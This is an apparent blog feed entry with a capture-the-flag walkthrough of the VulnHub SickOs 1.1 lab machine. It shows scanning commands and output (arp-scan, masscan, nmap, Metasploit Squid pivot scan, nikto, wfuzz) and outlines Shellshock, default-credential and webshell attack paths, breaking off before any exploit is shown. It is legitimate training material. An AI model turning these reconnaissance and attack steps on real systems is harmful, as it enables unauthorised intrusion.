<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: sickos | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/sickos/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2016-08-10T09:12:30-04:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[VulnHub] SickOs 1.1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/12/24/vulnhub-sickos-1-dot-1/"/>
    <updated>2015-12-24T22:22:17-05:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/12/24/vulnhub-sickos-1-dot-1</id>
    <content type="html"><![CDATA[<p>&ldquo;This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/d4rk,199/">D4rk</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sickos-11,132/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: Sick0s: 1.1 (<em>10.1.1.149/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Squid Proxy misconfiguration</li>
<li>Shellshock bug</li>
<li>Wolf CMS 0.8.2 admin weak password</li>
<li>Sensitivie information disclosure</li>
<li>Local priv escape by misconfigured sudo list</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Exploit misconfigured Squid proxy to discover more hidden ports [<font color="FF8000">msfconsole with exploit: auxiliary/scanner/http/squid_pivot_scanning</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Brute fuzz to find hidden files and paths [<font color="FF8000">wfuzz</font>]</li>
<li>Login Wolf CMS 0.8.2 backend admin page with weak login credential <code>admin / admin</code></li>
<li>Exploit shellcode or upload webshell through wolfcms admin to get a limited shell</li>
<li>Enumeration and exploit the misconfigured sudo list to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://www.metasploit.com/">Metasploit</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://www.edge-security.com/wfuzz.php">wfuzz</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.149 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.149  00:0c:29:48:e9:66   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:ea:f1:fb   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.603 seconds <span class="o">(</span>98.35 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.149</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.149/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2015-12-16 11:23:26 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.149                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 3128/tcp on 10.1.1.149
</span></code></pre></td></tr></table></div></figure></p>

<p>There are 2 ports (22, 3128) detected by <code>masscan</code>, then I run <code>nmap</code> to do a deeper service scan.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Nmap 6.49BETA5 scan initiated Wed Dec <span class="m">16</span> 06:25:04 <span class="m">2015</span> as: nmap -v -O -A -sV -p22,3128 -oN 10.1.1.149_nmap.txt 10.1.1.149&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Nmap scan report <span class="k">for</span> 10.1.1.149
</span><span class='line'>Host is up <span class="o">(</span>0.0027s latency<span class="o">)</span>.
</span><span class='line'>PORT     STATE SERVICE    VERSION
</span><span class='line'>22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;  <span class="m">256</span> 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>3128/tcp open  http-proxy Squid http proxy 3.1.19
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 400<span class="o">)</span>
</span><span class='line'><span class="p">|</span> http-open-proxy: Potentially OPEN proxy.
</span><span class='line'><span class="p">|</span>&lt;em&gt;Methods supported:GET
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: squid/3.1.19
</span><span class='line'><span class="p">|</span>_http-title: ERROR: The requested URL could not be retrieved
</span><span class='line'>MAC Address: 00:0C:29:48:E9:66 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.19
</span><span class='line'>Uptime guess: 0.019 days <span class="o">(</span>since Wed Dec <span class="m">16</span> 05:58:20 2015<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncate <span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Based on the result, I noticed that <code>OpenSSH 5.9p1</code> and <code>Squid Proxy v3.1.19</code> are running on port 22 and 3128. By searching exist exploit online against the squid proxy, I found the following misconfiguration vulnerability in rapid7: <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning" title="Squid Proxy Port Scanner">Squid proxy port scanner</a>, which can be used to do an internal network scan.</p>

<p>So I start <code>msfconsole</code> and loaded the exploit <code>squid_pivot_scanning</code> with the following optoins:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf auxiliary<span class="o">(</span>squid_pivot_scanning<span class="o">)</span> &gt; show options&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Module options <span class="o">(</span>auxiliary/scanner/http/squid_pivot_scanning<span class="o">)</span>:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Name          Current Setting                                  Required  Description&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   CANARY_IP     1.2.3.4                                          yes       The IP to check <span class="k">if</span> the proxy always answers positively<span class="p">;</span> the IP should not respond.
</span><span class='line'>   MANUAL_CHECK  <span class="nb">true                                             </span>yes       Stop the scan <span class="k">if</span> server seems to answer positively to every request
</span><span class='line'>   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan<span class="p">;</span> must be TCP
</span><span class='line'>   Proxies                                                        no        A proxy chain of format <span class="nb">type</span>:host:port<span class="o">[</span>,type:host:port<span class="o">][</span><span class="p">&amp;</span>hellip<span class="p">;</span><span class="o">]</span>
</span><span class='line'>   RANGE         10.1.1.149                                       yes       IPs to scan through Squid proxy
</span><span class='line'>   RHOSTS        10.1.1.149                                       yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT         <span class="m">3128</span>                                             yes       The target port
</span><span class='line'>   THREADS       <span class="m">200</span>                                              yes       The number of concurrent threads
</span><span class='line'>   VHOST                                                          no        HTTP server virtual host&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf auxiliary<span class="o">(</span>squid_pivot_scanning<span class="o">)</span> &gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Run it and got the following result, TCP port 80 seems open:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf auxiliary<span class="o">(</span>squid_pivot_scanning<span class="o">)</span> &gt; run&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">21</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149:80 seems OPEN
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">139</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">445</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">1433</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">1521</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">1723</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">3389</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">8080</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">9100</span> is CLOSED
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Auxiliary module execution completed
</span><span class='line'>msf auxiliary<span class="o">(</span>squid_pivot_scanning<span class="o">)</span> &gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>In order to the verify if port 80 is open, I start up firefox and set the proxy points to <code>10.1.1.149:3128</code> then access <code>http://10.1.1.149/</code>.</p>

<p><img class="left" src="/downloads/SickOs1.1/1.png"></p>

<p>and yes, there is web service listening on target machine&rsquo;s port 80.</p>

<p><img class="left" src="/downloads/SickOs1.&frac12;.png"></p>

<p>Then I use <code>nikto</code> to scan common web vulnerabilities.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.149
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET Retrieved via header: 1.0 localhost <span class="o">(</span>squid/3.1.19<span class="o">)</span>
</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>x-cache-lookup<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: MISS from localhost:3128
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>x-cache<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: MISS from localhost
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Fri Dec  <span class="m">4</span> 19:35:02 2015
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>x-squid-error<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: ERR_INVALID_REQ 0
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>tcn<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: list
</span><span class='line'>+ GET Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.wisec.it/sectou.php?id=4698ebdc59d15.&quot;</span>&gt;http://www.wisec.it/sectou.php?id<span class="o">=</span>4698ebdc59d15.&lt;/a&gt; The following alternatives <span class="k">for</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>index<span class="p">&amp;</span>rsquo<span class="p">;</span> were found: index.php
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>nikto-added-cve-2014-6278<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: <span class="nb">true</span>
</span><span class='line'>+ OSVDB-112004: GET /cgi-bin/status: Site appears vulnerable to the <span class="p">&amp;</span>lsquo<span class="p">;</span>shellshock<span class="p">&amp;</span>rsquo<span class="p">;</span> vulnerability <span class="o">(</span>CVE-2014-6271<span class="o">)</span>.
</span><span class='line'>+ OSVDB-112004: GET /cgi-bin/status: Site appears vulnerable to the <span class="p">&amp;</span>lsquo<span class="p">;</span>shellshock<span class="p">&amp;</span>rsquo<span class="p">;</span> vulnerability <span class="o">(</span>CVE-2014-6278<span class="o">)</span>.
</span><span class='line'>+ ZSMPGCHN Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
</span><span class='line'>+ OSVDB-12184: GET /?<span class="o">=</span>PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: GET /?<span class="o">=</span>PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: GET /?<span class="o">=</span>PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: GET /?<span class="o">=</span>PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-3093: GET /.bash_history: A user<span class="p">&amp;</span>rsquo<span class="p">;</span>s home directory may be <span class="nb">set </span>to the web root, the shell <span class="nb">history </span>was retrieved. This should not be accessible via the web.
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span></code></pre></td></tr></table></div></figure></p>

<p>From the result, a <code>shellsock</code> vulnerability was found in target server under the path <code>/cgi-bin/status</code>.</p>

<p>In the meanwhile, I also run <code>wfuzz</code> to brute force crack/scan the hidden files/directories on the target server.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/SickOs# wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt <span class="p">&amp;</span>ndash<span class="p">;</span>hc <span class="m">404</span> -p 10.1.1.149:3128 &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.149/FUZZ&quot;</span>&gt;http://10.1.1.149/FUZZ&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Wfuzz  2.0 - The Web Bruteforcer                     *&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Target: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.149/FUZZ&quot;</span>&gt;http://10.1.1.149/FUZZ&lt;/a&gt;
</span><span class='line'>Payload <span class="nb">type</span>: file,/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Total requests: 87664&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;ID  Response   Lines      Word         Chars          Request    &lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;00001:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span> - <span class="c"># Copyright 2007 James Fisher&amp;rdquo;</span>
</span><span class='line'>00002:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span>sit &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://creativecommons.org/licenses/by-sa/3.0/&quot;</span>&gt;http://creativecommons.org/licenses/by-sa/3.0/&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>00003:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span> - <span class="c">#&amp;rdquo;</span>
</span><span class='line'>00004:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span>ered <span class="k">case</span> sensative list, where entries were found<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>00005:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span> - <span class="c">#&amp;rdquo;</span>
</span><span class='line'>00006:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span>on-Share Alike 3.0 License. To view a copy of this<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>00007:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span> - <span class="c">#&amp;rdquo;</span>
</span><span class='line'>00008:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span> - <span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>00009:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span> - <span class="c"># on atleast 3 different hosts&amp;rdquo;</span>
</span><span class='line'>00011:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span> - <span class="c">#&amp;rdquo;</span>
</span><span class='line'>00014:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="c"># This work is licensed under the Creative Commons&amp;rdquo;</span>
</span><span class='line'>00015:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span>d a letter to Creative Commons, <span class="m">171</span> Second Street,<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>00016:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span> - <span class="c"># directory-list-2.3-small.txt&amp;rdquo;</span>
</span><span class='line'>00010:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span> Suite 300, San Francisco, California, 94105, USA.<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>00294:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">3</span> W       <span class="m">21</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span> - index<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>01601:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">4</span> L        <span class="m">17</span> W      <span class="m">109</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span> - connect<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>01770:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L         <span class="m">6</span> W       <span class="m">45</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span> - robots<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>Stopping<span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/SickOs#
</span></code></pre></td></tr></table></div></figure></p>

<p>Here I found three hidden files, after checked them one by one, I noticed that there is another hidden path <code>/wolfcms</code> found in file <code>http://10.1.1.149/robots</code>.</p>

<p><img class="left" src="/downloads/SickOs1.1/3.png"></p>

<p><strong><font color="red">[note!!]</font></strong> From now on, there are two attacking vectors against the target server, one is to exploit <code>shellshock</code> vulnerability found previously in <code>http://10.1.1.149/cgi-bin/status</code> and the other one is to find and exploit vulnerability in the CMS system: <code>wolfcms</code>.</p>

<h3>0x00 Verify and exploit shell bug</h3>

